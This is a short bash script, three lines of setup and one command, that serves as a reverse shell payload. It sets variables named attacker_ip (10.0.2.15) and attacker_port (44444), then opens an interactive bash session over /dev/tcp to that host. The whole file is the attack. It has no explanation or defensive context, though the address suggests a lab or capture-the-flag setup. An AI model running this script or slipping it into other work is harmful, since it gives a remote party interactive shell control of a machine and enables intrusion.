#!/bin/bash
attacker_ip=10.0.2.15
attacker_port=44444
/bin/bash -c /bin/bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1